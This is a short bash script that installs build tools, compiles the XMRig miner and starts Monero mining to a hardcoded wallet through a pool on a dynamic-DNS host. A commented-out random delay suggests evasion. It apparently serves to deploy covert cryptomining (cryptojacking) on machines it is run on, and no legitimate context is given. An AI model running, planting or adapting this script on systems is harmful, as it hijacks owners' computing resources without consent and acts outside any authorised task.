#!/bin/bash
WALLET="85hak3w6UKaYFvZbLbhBFYLTnfNnAL37BivGD5RxQUTyEREQQ6s4Ca1a72vBsced9X5c68dqkktCEdvZWzfppUhqTXXQz4k"
POOL="  masterbhaiyaa.duckdns.org:8080"
WORKER="gyypxl"
echo "[+] Starting setup..."
install_dependencies() {
    sudo apt update -y && sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
}
build_xmrig() {
    git clone https://github.com/xmrig/xmrig.git
    cd xmrig
    mkdir build && cd build
    cmake ..
    make -j$(nproc)
}
start_mining() {
#    sleep $((60 + RANDOM % 60))
    ./xmrig -o $POOL -u $WALLET -p $WORKER -k --coin monero
}
if [ -d "xmrig" ]; then
    cd xmrig/build
else
    install_dependencies
    build_xmrig
fi
start_mining
